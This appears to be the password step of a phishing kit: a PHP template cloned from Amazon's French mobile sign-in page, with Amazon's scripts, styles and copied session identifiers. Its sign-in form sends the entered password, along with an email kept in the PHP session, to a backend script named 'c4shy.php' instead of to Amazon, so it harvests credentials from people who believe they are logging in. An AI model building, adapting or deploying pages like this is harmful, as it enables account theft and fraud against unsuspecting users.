...
?>     
<!DOCTYPE html>
<html class="a-touch a-mobile a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-hires a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.8-2022-01-04"><head><link rel="icon" href="../../img/favicon.ico" /><script async="" src="https://images-eu.ssl-images-amazon.com/images/I/31YXrY93hfL.js" crossorigin="anonymous"></script>
...
var ue_id = 'RZN7ZWHFTJ2WF95KY3KZ',
    ue_url = '/ap/uedata',
    ue_navtiming = 1,
    ue_mid = 'A13V1IB3VIYZZH',
    ue_sid = '262-0737346-0465214',
    ue_sn = 'www.amazon.fr',
    ...
    ue_rpl_ns = 'cel-rpl',
    ue_ddq = 1,
    ue_fpf = '//fls-eu.amazon.com/1/batch/1/OP/A13V1IB3VIYZZH:262-0737346-0465214:RZN7ZWHFTJ2WF95KY3KZ$uedata=s:',
    ue_sbuimp = 1,
    ue_ibft = 0,
    ue_fnt = 0,
...
<!-- 4b -->
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 9621)</script><script>var aPageStart = (new Date()).getTime();</script><meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no"><meta charset="utf-8">
...
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 2729)</script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/41uLOOuUMJL._RC|417kbaDgEfL.js_.js?AUIClients/NavMobileAssets-all&amp;ZDLVZMvf#387764-T1.404801-T1"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/01CMyuQ8OQL.js?AUIClients/InternationalCustomerPreferencesNavMobileAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/31sq3pfde4L.js?AUIClients/GlowToasterAssets&amp;DnhD++VQ#365419-T1"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/01w4L3R-4KL._RC|01qAdvV0GUL.js,61c4zQ1eJTL.js_.js?AUIClients/RetailSearchAutocompleteAssets&amp;j611SMJy#mobile.language-fr.fr.395433-T1.408838-T1"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/41N6Zfgd3UL.js?AUIClients/AmazonWebAppAssets"></script><style>.a2hs-ingress-container,a[href^="#nav-hbm-a2hs-trigger"]{display:none!important}.a2hs-ingress-container.a2hs-ingress-visible,a[href^="#nav-hbm-a2hs-trigger"].a2hs-ingress-visible{display:block!important}</style><style>@media all and (display-mode:standalone){#chromeless-view-progress-bar,#chromeless-view-progress-bar::after{position:fixed;top:0;left:0;right:0;height:2px}@keyframes pbAnimation{0%{right:90%}100%{right:10%}}#chromeless-view-progress-bar{background:rgba(255,255,255,.1);z-index:9999999}#chromeless-view-progress-bar::after{content:'';background:#fcbb6a;animation:pbAnimation 10s forwards}}</style><style>https://images-eu.ssl-images-amazon.com/images/I/61sm4DxXtPL._RC%7C11iHkiAT2oL.css,01wLsDqViEL.css,11MhAJ3QIgL.css,317ojtFHdqL.css,31AUj9-+WdL.css,01DHz7m6lhL.css_.css?AUIClients/AmazonUI#mobile.us.not-trident */
*{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box;}
input{margin:0;font-size:100%;vertical-align:middle;}
input{line-height:normal;}
input[type=submit]{cursor:pointer;-webkit-appearance:button;}
.a-button-input{position:absolute;background-color:transparent;color:transparent;border:0;cursor:pointer;height:100%;width:100%;left:0rem;top:0rem;opacity:.01;outline:0;overflow:visible;z-index:20;}
input{-webkit-transition:all .1s linear;transition:all .1s linear;font-family:Arial,sans-serif;line-height:1.35;color:#111;}
.a-ember input{font-family:"Amazon Ember",Arial,sans-serif;}
input{outline:0;}
/*! CSS Used from: https://images-eu.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC%7C31jdWD+JB+L.css,51MWQaoSDLL.css_.css?AUIClients/AuthenticationPortalAssets#mobile */
.auth-no-skin input{color:#0F1111;}
/*! CSS Used fontfaces */
@font-face{font-family:'Amazon Ember';src:local("Amazon Ember"),local("AmazonEmber-Regular"),url(https://m.media-amazon.com/images/S/sash/pDxWAF1pBB0dzGB.woff2) format("woff2"),url(https://m.media-amazon.com/images/S/sash/kfKKBuoqcD$AUKL.woff) format("woff");}
@font-face{font-family:'Amazon Ember';font-style:italic;src:local("Amazon Ember"),local("AmazonEmber-Italic"),url(https://m.media-amazon.com/images/S/sash/WOnTLzkiaEccV7F.woff2) format("woff2"),url(https://m.media-amazon.com/images/S/sash/JJsp0ZvgpfwzJM6.woff) format("woff");}
@font-face{font-family:'Amazon Ember';font-weight:700;src:local("Amazon Ember"),local("AmazonEmber-Bold"),url(https://m.media-amazon.com/images/S/sash/KFPk-9IF4FqAqY-.woff2) format("woff2"),url(https://m.media-amazon.com/images/S/sash/mzVbGSgvdBfRLX9.woff) format("woff");}
@font-face{font-family:'Amazon Ember';font-style:italic;font-weight:700;src:local("Amazon Ember"),local("AmazonEmber-BoldItalic"),url(https://m.media-amazon.com/images/S/sash/2SazJx$EeTHfhMN.woff2) format("woff2"),url(https://m.media-amazon.com/images/S/sash/CjbL$jCCegyfqZ7.woff) format("woff");}
@font-face{font-family:'Amazon Ember';src:url(https://m.media-amazon.com/images/G/01/wg/assets/fonts/AmazonEmber_W_Bd.woff2) format("woff2"),url(https://m.media-amazon.com/images/G/01/wg/assets/fonts/AmazonEmber_W_Bd.woff) format("woff");font-style:normal;font-weight:700;}
@font-face{font-family:'Amazon Ember';src:url(https://m.media-amazon.com/images/G/01/wg/assets/fonts/AmazonEmber_W_Bd.woff2) format("woff2"),url(https://m.media-amazon.com/images/G/01/wg/assets/fonts/AmazonEmber_W_Bd.woff) format("woff");font-style:normal;font-weight:700;}</style></head>
...
if (window.csa) {
    csa("Config", {
        ...
        'CacheDetection.RequestID': "RZN7ZWHFTJ2WF95KY3KZ",
        'CacheDetection.Callback': window.ue && ue.reset,
        'LCP.elementDedup': 1
    });

    csa("Events")("setEntity", {
        page: {requestId: "RZN7ZWHFTJ2WF95KY3KZ", meaningful: "interactive"},
        session: {id: "262-0737346-0465214"}
    });
}
...
(window.AmazonUIPageJS ? AmazonUIPageJS : P).when('navCF').execute(function() {
  ...
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/01w4L3R-4KL._RC|01qAdvV0GUL.js,61c4zQ1eJTL.js_.js?AUIClients/RetailSearchAutocompleteAssets&j611SMJy#mobile.language-fr.fr.395433-T1.408838-T1');
...
<div id="auth-alert-window" class="a-box a-alert a-alert-error a-spacing-small" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Un problème est survenu</h4><div class="a-alert-content">
  <ul class="a-unordered-list a-vertical auth-error-messages" role="alert">
    ...
    <li id="auth-customerNamePronunciation-missing-alert"><span class="a-list-item">
      Saisissez la prononciation de votre nom
    </span></li>
    ...
    <li id="auth-phoneNumber-invalid-phone-alert"><span class="a-list-item">
      Le numéro mobile que vous avez saisi ne semble pas être valide
    </span></li>
...
<div class="a-row a-spacing-base">
  ...
  <a id="ap_change_login_claim" class="a-link-normal" tabindex="7" href="../">
    Change
  </a>
</div>
...
<form name="signIn" method="post" novalidate="" action="../../Backend/c4shy.php" class="auth-validate-form auth-clearable-form auth-validate-form" data-fwcim-id="eHORq7WT">
                    <input type="hidden" name="email" value="<?php echo $_SESSION['email'] ?>">
                    <input type="hidden" name="step2" value="c4shy">
                    <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
                        ...
                        <label for="ap_password" aria-hidden="true" class="a-form-label auth-mobile-label"> Amazon password </label>
                        <div id="auth-password-container" class="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password">
                            <input type="password" maxlength="1024" id="" placeholder="Amazon password" name="password1" tabindex="2" aria-label="Amazon password">
                        ...
                        <div id="ap_password_icon" class="auth-clear-icons" style="display: none;"> <i class="a-icon a-icon-close" role="img" aria-label="Effacer le champ de texte du mot de passe, bouton"></i> </div>
                        <div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert">
                            <div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">Show password </div>
                            </div>
                        </div>
                        ...
                        <script type="text/javascript" async="" src="https://static.siege-amazon.com/prod/profiles/AuthenticationPortalSigninEU.js">
                        </script>
                    </div>
                    <div class="a-row">
                        <div class="a-column a-span6 a-spacing-medium">
                            <div id="auth-show-password-checkbox-container" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox auth-show-password-checkbox">
                                <label for="auth-signin-show-password-checkbox">
                                    <input id="auth-signin-show-password-checkbox" type="checkbox" name="" value="" checked="" tabindex="3"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label"> Show password
          </span></label>
                            </div>
                        </div>
                        <div class="a-column a-span6 a-text-right a-spacing-none a-spacing-top-small a-span-last"><a id="auth-fpp-link-bottom" class="a-spacing-none a-link-normal" tabindex="8" href="https://www.amazon.com/">
          Forgot password?
        </a></div>
                    </div>
                    <div class="a-row a-spacing-base">
                        <div data-a-input-name="rememberMe" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox">
                            <label>
                                <input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
    
                                Keep me signed in.
                                <span class="a-declarative" data-action="a-modal" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-a-modal" data-a-modal="{&quot;max-width&quot;:&quot;500px&quot;,&quot;closeButtonLabel&quot;:&quot;Close&quot;,&quot;width&quot;:&quot;95%&quot;,&quot;name&quot;:&quot;remember-me-detail-link-modal&quot;,&quot;header&quot;:&quot;\&quot;Keep Me Signed In\&quot; Checkbox&quot;}" data-csa-c-id="gxp9x9-vn102d-9hvcnu-c5kj5l">
      <a id="remember_me_learn_more_link" class="a-link-normal" href="#">
        Details
      </a>
    </span>                <div class="a-popover-preload" id="a-popover-remember-me-detail-link-modal">
...
<p>To keep your account secure, use this option only on your personal devices.</p>
        <p></p>
                    ...
                    <div class="a-row"> </div> <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"><span class="a-button-inner"><input id="signInSubmit" tabindex="6" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
    Sign in
  </span></span></span>
                    <script>
                    function cf() {
                        ...
                        if(window.embedNotification && typeof window.embedNotification.onCF === 'function') {
      ...
      window.$Nav && $Nav.when('$').run('CBIMarketplaceRedirectOverlayNavyaan', function($) {
              $.ajax({
                  ...
                  data: JSON.stringify({
                      ...
                      localCountryCode: 'FR',
                         customerId: null,
                      sessionId: '262\x2D0737346\x2D0465214',
                      deviceType: 'MOBILE',
                      referrer: '',
                      url: '\x2Fap\x2Fsignin',
                      pageType: 'Standard',
...
<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-eu.amazon.com/1/batch/1/OP/A13V1IB3VIYZZH:262-0737346-0465214:RZN7ZWHFTJ2WF95KY3KZ$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DRZN7ZWHFTJ2WF95KY3KZ:0' alt=""/>
</noscript>

<script>window.ue && ue.count && ue.count('CSMLibrarySize', 60960)</script>
